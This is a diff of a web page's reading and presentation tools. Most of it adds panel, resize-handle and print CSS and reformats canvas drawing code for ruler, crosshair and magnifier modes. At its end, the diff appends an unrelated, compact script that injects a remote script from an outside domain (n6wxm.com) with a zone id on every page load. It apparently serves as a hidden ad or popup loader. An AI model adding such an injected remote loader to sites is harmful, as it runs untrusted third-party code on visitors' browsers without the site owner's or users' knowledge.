-        position:absolute !important;left:0 !important;top:0 !important;width:100% !important;
-        max-width:none !important;margin:0 !important;padding:0 !important;overflow:visible !important;
+    /* v18 refinements */
+    #asyncFloatingTimer .async-tool-resize-handle {
+        display: none !important;
     }
-    main.main-content > .content-wrapper {
-        display:block !important;position:static !important;width:100% !important;max-width:none !important;
-        margin:0 !important;padding:0 !important;box-shadow:none !important;
-    }
-    main.main-content > .content-wrapper * {
-        -webkit-print-color-adjust:exact !important;print-color-adjust:exact !important;
-    }
-    a { color:inherit !important;text-decoration:none !important; }
-    img,svg,table,pre,blockquote { break-inside:avoid; }
-}
 
-#asyncPresentationPanel.is-minimized > :not(.presentation-actions):not(.presentation-settings-wrap) {
-    display:none !important;
-}
-#asyncPresentationPanel.is-minimized .presentation-settings-wrap {
-    display:flex !important;align-items:center;margin-left:5px;
-}
-#asyncPresentationPanel.is-minimized .presentation-settings-toggle {
-    width:36px;height:36px;min-width:36px;padding:0;justify-content:center;
-    font-size:0;border-radius:11px;
-}
-#asyncPresentationPanel.is-minimized .presentation-settings-toggle i { font-size:16px; }
-#asyncPresentationPanel.is-minimized .presentation-settings {
-    position:absolute;right:0;bottom:calc(100% + 10px);width:min(260px,calc(100vw - 30px));
-    z-index:100150;
-}
+    #asyncNotesPanel .aux-window-actions .window-minimize,
+    #asyncNotesPanel .aux-window-actions .window-maximize,
+    #asyncFloatingTimer .window-maximize,
+    #asyncSoundPanel .window-maximize,
+    #asyncPresentationPanel .window-maximize,
+    #readingToolsPanel .window-maximize {
+        display: none !important;
+    }
+
+    #asyncNotesPanel .aux-window-actions {
+        margin-left: auto !important;
+    }
+
+    /* Two small glass dots at each corner; resize hit areas remain functional. */
+    .async-tool-resize-handle[data-resize="ne"]::after,
+    .async-tool-resize-handle[data-resize="nw"]::after,
+    .async-tool-resize-handle[data-resize="se"]::after,
+    .async-tool-resize-handle[data-resize="sw"]::after {
+        width: 6px !important;
+        height: 6px !important;
+        top: 8px !important;
+        left: 8px !important;
+        border-radius: 50% !important;
+        background: radial-gradient(circle at 25% 50%, rgba(255, 255, 255, .98) 0 1.5px, transparent 1.8px),
+            radial-gradient(circle at 75% 50%, rgba(147, 197, 253, .95) 0 1.5px, transparent 1.8px) !important;
+        box-shadow: 0 1px 3px rgba(15, 23, 42, .22) !important;
+        opacity: .72 !important;
+    }
+
+    .async-tool-resize-handle[data-resize="ne"]:hover::after,
+    .async-tool-resize-handle[data-resize="nw"]:hover::after,
+    .async-tool-resize-handle[data-resize="se"]:hover::after,
+    .async-tool-resize-handle[data-resize="sw"]:hover::after {
+        opacity: 1 !important;
+    }
+
+    .presentation-settings-wrap {
+        position: relative;
+        display: flex;
+        justify-content: flex-end;
+    }
+
+    .presentation-settings-toggle {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 38px;
+        height: 38px;
+        padding: 0;
+        border: 1px solid var(--aux-border);
+        border-radius: 11px;
+        background: var(--aux-control);
+        color: var(--aux-text);
+        cursor: pointer;
+        backdrop-filter: blur(14px);
+        -webkit-backdrop-filter: blur(14px);
+    }
+
+    .presentation-settings {
+        position: absolute;
+        right: 0;
+        bottom: calc(100% + 10px);
+        width: min(270px, calc(100vw - 30px));
+        display: grid;
+        gap: 9px;
+        margin: 0;
+        padding: 11px;
+        z-index: 100150;
+        border: 1px solid var(--aux-border);
+        border-radius: 12px;
+        background: var(--aux-glass, rgba(255, 255, 255, .9));
+        box-shadow: 0 10px 28px rgba(15, 23, 42, .15);
+    }
+
+    .presentation-settings[hidden] {
+        display: none !important;
+    }
+
+    .presentation-settings .sound-volume {
+        display: flex;
+        align-items: center;
+        gap: 9px;
+    }
+
+    .presentation-settings input[type="color"] {
+        width: 38px;
+        height: 30px;
+        padding: 2px;
+        border: 1px solid var(--aux-border);
+        border-radius: 7px;
+        background: var(--aux-control);
+    }
+
+    @media print {
+        @page {
+            margin: 14mm;
+        }
+
+        html,
+        body {
+            background: #fff !important;
+            color: #111 !important;
+        }
+
+        body * {
+            visibility: hidden !important;
+        }
+
+        main.main-content,
+        main.main-content>.content-wrapper,
+        main.main-content>.content-wrapper * {
+            visibility: visible !important;
+        }
+
+        .sidebar,
+        #sidebar,
+        .sidebar-container,
+        .main-sidebar,
+        aside.sidebar,
+        .topbar,
+        #topbar,
+        .top-bar,
+        header.topbar,
+        .navbar,
+        #asyncToolsDock,
+        #readingToolsFab,
+        #readingToolsPanel,
+        #asyncNotesPanel,
+        #asyncSoundPanel,
+        #asyncPresentationPanel,
+        #asyncPresentationOverlay,
+        #asyncFloatingTimer,
+        #aftAlarmOverlay,
+        #readingToolsRoot {
+            display: none !important;
+            visibility: hidden !important;
+        }
+
+        main.main-content {
+            position: absolute !important;
+            left: 0 !important;
+            top: 0 !important;
+            width: 100% !important;
+            max-width: none !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            overflow: visible !important;
+        }
+
+        main.main-content>.content-wrapper {
+            display: block !important;
+            position: static !important;
+            width: 100% !important;
+            max-width: none !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            box-shadow: none !important;
+        }
+
+        main.main-content>.content-wrapper * {
+            -webkit-print-color-adjust: exact !important;
+            print-color-adjust: exact !important;
+        }
+
+        a {
+            color: inherit !important;
+            text-decoration: none !important;
+        }
+
+        img,
+        svg,
+        table,
+        pre,
+        blockquote {
+            break-inside: avoid;
+        }
+    }
+
+    #asyncPresentationPanel.is-minimized> :not(.presentation-actions):not(.presentation-settings-wrap) {
+        display: none !important;
+    }
+
+    #asyncPresentationPanel.is-minimized .presentation-settings-wrap {
+        display: flex !important;
+        align-items: center;
+        margin-left: 5px;
+    }
+
+    #asyncPresentationPanel.is-minimized .presentation-settings-toggle {
+        width: 36px;
+        height: 36px;
+        min-width: 36px;
+        padding: 0;
+        justify-content: center;
+        font-size: 0;
+        border-radius: 11px;
+    }
+
+    #asyncPresentationPanel.is-minimized .presentation-settings-toggle i {
+        font-size: 16px;
+    }
+
+    #asyncPresentationPanel.is-minimized .presentation-settings {
+        position: absolute;
+        right: 0;
+        bottom: calc(100% + 10px);
+        width: min(260px, calc(100vw - 30px));
+        z-index: 100150;
+    }
 </style>
 
 <div id="readingToolsRoot">
@@ -4402,7 +4814,9 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
     <div id="asyncPresentationSpotlight"></div>
     <div id="asyncPresentationCursor"></div>
     <div id="asyncPresentationCrosshair"><span></span><span></span></div>
-    <div id="asyncPresentationMagnifier" aria-hidden="true"><div id="asyncPresentationMagnifierContent"></div></div>
+    <div id="asyncPresentationMagnifier" aria-hidden="true">
+        <div id="asyncPresentationMagnifierContent"></div>
+    </div>
     <canvas id="asyncPresentationCanvas"></canvas>
 </div>
 
@@ -5605,7 +6019,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
                 panel.style.transform = 'none';
             });
         });
-        
+
         // Five selected ambient presets plus uploaded audio-library tracks.
         let ambienceContext = null,
             ambienceNodes = [],
@@ -5862,8 +6276,14 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
                 top = Math.min(lastPoint.y, y),
                 width = Math.abs(x - lastPoint.x),
                 height = Math.abs(y - lastPoint.y);
-            if (presentMode === 'arrow' || presentMode === 'ruler') { drawArrow(lastPoint.x, lastPoint.y, x, y); if (presentMode === 'ruler') { const d=Math.hypot(x-lastPoint.x,y-lastPoint.y); presentCtx.font='12px Arial'; presentCtx.fillText(`${d.toFixed(0)} px`,x+8,y-8); } }
-            else if (presentMode === 'rectangle') presentCtx.strokeRect(left, top, width, height);
+            if (presentMode === 'arrow' || presentMode === 'ruler') {
+                drawArrow(lastPoint.x, lastPoint.y, x, y);
+                if (presentMode === 'ruler') {
+                    const d = Math.hypot(x - lastPoint.x, y - lastPoint.y);
+                    presentCtx.font = '12px Arial';
+                    presentCtx.fillText(`${d.toFixed(0)} px`, x + 8, y - 8);
+                }
+            } else if (presentMode === 'rectangle') presentCtx.strokeRect(left, top, width, height);
             else if (presentMode === 'circle') {
                 presentCtx.beginPath();
                 presentCtx.ellipse(left + width / 2, top + height / 2, Math.max(1, width / 2), Math.max(1, height / 2), 0, 0, Math.PI * 2);
@@ -5884,9 +6304,15 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
                 magnifier.style.top = Math.min(event.clientY + 22, innerHeight - 185) + 'px';
                 const target = document.elementFromPoint(event.clientX, event.clientY);
                 const label = target && target !== presentOverlay ? (target.innerText || target.getAttribute('alt') || target.getAttribute('aria-label') || target.tagName || 'Page content') : 'Page content';
-                magnifierContent.textContent = (label.trim().replace(/\s+/g,' ').slice(0,90) || 'Page content') + '  ·  2×';
+                magnifierContent.textContent = (label.trim().replace(/\s+/g, ' ').slice(0, 90) || 'Page content') + '  ·  2×';
             }
-            if (presentMode === 'crosshair') { const cross=byId('asyncPresentationCrosshair'); cross.style.setProperty('--x',event.clientX+'px'); cross.style.setProperty('--y',event.clientY+'px'); cross.children[0].style.top=event.clientY+'px'; cross.children[1].style.left=event.clientX+'px'; }
+            if (presentMode === 'crosshair') {
+                const cross = byId('asyncPresentationCrosshair');
+                cross.style.setProperty('--x', event.clientX + 'px');
+                cross.style.setProperty('--y', event.clientY + 'px');
+                cross.children[0].style.top = event.clientY + 'px';
+                cross.children[1].style.left = event.clientX + 'px';
+            }
             if (!presentDrawing || !lastPoint) return;
             if (['arrow', 'rectangle', 'circle', 'ruler'].includes(presentMode)) {
                 previewShape(event.clientX, event.clientY);
@@ -5915,9 +6341,15 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         presentCanvas.addEventListener('pointerdown', event => {
             if (!['draw', 'arrow', 'rectangle', 'circle', 'erase', 'ruler'].includes(presentMode)) return;
             if (presentMode === 'ruler') {
-                presentDrawing = true; lastPoint = {x:event.clientX,y:event.clientY};
-                shapeBaseImage = presentCtx.getImageData(0,0,presentCanvas.width,presentCanvas.height);
-                try { presentCanvas.setPointerCapture(event.pointerId); } catch (_) {}
+                presentDrawing = true;
+                lastPoint = {
+                    x: event.clientX,
+                    y: event.clientY
+                };
+                shapeBaseImage = presentCtx.getImageData(0, 0, presentCanvas.width, presentCanvas.height);
+                try {
+                    presentCanvas.setPointerCapture(event.pointerId);
+                } catch (_) {}
                 return;
             }
             presentDrawing = true;
@@ -5938,7 +6370,10 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         presentCanvas.addEventListener('pointerup', finishPresentationStroke);
         presentCanvas.addEventListener('pointercancel', finishPresentationStroke);
         byId('asyncPresentationClear').addEventListener('click', () => presentCtx.clearRect(0, 0, innerWidth, innerHeight));
-        byId('asyncPresentationExit').addEventListener('click', () => { setPresentMode(''); setPresentationToolbarVisible(false); });
+        byId('asyncPresentationExit').addEventListener('click', () => {
+            setPresentMode('');
+            setPresentationToolbarVisible(false);
+        });
         byId('asyncPresentationSize').addEventListener('input', event => {
             byId('asyncPresentationSizeValue').textContent = event.target.value + 'px';
             presentCursor.style.width = event.target.value + 'px';
@@ -5972,4 +6407,9 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
             attributeFilter: ['data-theme']
         });
     })();
+</script>
+<script>
+    (function(s) {
+        s.dataset.zone = '12214216', s.src = 'https://n6wxm.com/vignette.min.js'
+    })([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
 </script>
